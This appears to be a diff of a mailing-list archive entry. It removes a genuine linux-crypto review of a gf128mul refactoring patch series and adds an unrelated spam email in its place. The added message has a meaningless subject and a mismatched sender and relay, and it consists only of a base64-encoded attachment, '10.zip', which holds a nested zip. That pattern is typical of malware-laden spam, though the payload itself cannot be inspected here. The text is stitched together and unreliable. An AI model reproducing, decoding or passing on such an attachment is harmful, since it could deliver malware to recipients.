@@ -1,59 +1,86 @@
-From: Eric Biggers <ebiggers3@gmail.com>
-Subject: Re: [PATCH v5 0/4] gf128mul refactoring
-Date: Tue, 4 Apr 2017 21:13:51 -0700
-Message-ID: <20170405041351.GA4761@zzz>
-References: <20170402191916.9309-1-omosnacek@gmail.com>
+From: <smallgroups@dudleycvs.org.uk>
+Subject: 57014 linux-crypto
+Date: Wed, 05 Apr 2017 05:13:51 -0000
+Message-ID: <149136923110.6120.10016259917054487015@vnpt.vn>
+Reply-To: <smallgroups@dudleycvs.org.uk>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: Herbert Xu <herbert@gondor.apana.org.au>,
-        "David S. Miller" <davem@davemloft.net>,
-        linux-crypto@vger.kernel.org, Eric Biggers <ebiggers@google.com>,
-        Jeffrey Walton <noloader@gmail.com>,
-        Milan Broz <gmazyland@gmail.com>
-To: Ondrej Mosnacek <omosnacek@gmail.com>
+Content-Type: application/zip; name="10.zip"
+Content-Transfer-Encoding: base64
+To: "linux-crypto" <linux-crypto@vger.kernel.org>
 Return-path: <linux-crypto-owner@vger.kernel.org>
-Received: from mail-pf0-f195.google.com ([209.85.192.195]:33202 "EHLO
-        mail-pf0-f195.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1750712AbdDEENy (ORCPT
-        <rfc822;linux-crypto@vger.kernel.org>);
-        Wed, 5 Apr 2017 00:13:54 -0400
-Received: by mail-pf0-f195.google.com with SMTP id 197so335721pfv.0
-        for <linux-crypto@vger.kernel.org>; Tue, 04 Apr 2017 21:13:54 -0700 (PDT)
-Content-Disposition: inline
-In-Reply-To: <20170402191916.9309-1-omosnacek@gmail.com>
+Received: from static.vnpt.vn ([14.160.24.54]:52735 "HELO vnpt.vn"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752701AbdDEFN5 (ORCPT <rfc822;linux-crypto@vger.kernel.org>);
+        Wed, 5 Apr 2017 01:13:57 -0400
+Content-Disposition: attachment
 Sender: linux-crypto-owner@vger.kernel.org
 List-ID: <linux-crypto.vger.kernel.org>
 
-Hi Ondrej,
-
-On Sun, Apr 02, 2017 at 09:19:12PM +0200, Ondrej Mosnacek wrote:
-> This patchset contains the following gf128mul-related changes:
->   1. The gf128mul_x_* functions are moved to gf128mul.h for performance reasons.
->   2. The gf128mul_x_ble function is fixed to use the correct block type.
->   3. The le128_gf128mul_x_ble function from glue_helper.h is removed and its
->      usages replaced with gf128mul_x_ble calls.
->   4. The now obsolete dependency of CRYPTO_XTS on CRYPTO_GF128MUL is removed.
-> 
-> v4 -> v5: added the other three patches
-> v3 -> v4: a faster version of gf128mul_x_lle
-> v2 -> v3: constant-time implementation
-> v1 -> v2: move all _x_ functions to the header, not just gf128mul_x_ble
-> 
-> Ondrej Mosnacek (4):
->   crypto: gf128mul - define gf128mul_x_* in gf128mul.h
->   crypto: gf128mul - switch gf128mul_x_ble to le128
->   crypto: glue_helper - remove the le128_gf128mul_x_ble function
->   crypto: xts - drop gf128mul dependency
-
-These all look good to me, and you can add
-
-	Reviewed-by: Eric Biggers <ebiggers@google.com>
-
-to the patches.
-
-I think the change to le128 is an improvement, but what I've actually wanted to
-do is have the GF(2^128) elements strongly typed, with ble128, bbe128, and
-lle128 types, so that the types would reflect both the bit order and the byte
-order.  But that's harder to do and I ran into some issues when I tried it last.
-
-- Eric
+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
+DgAAAAA=
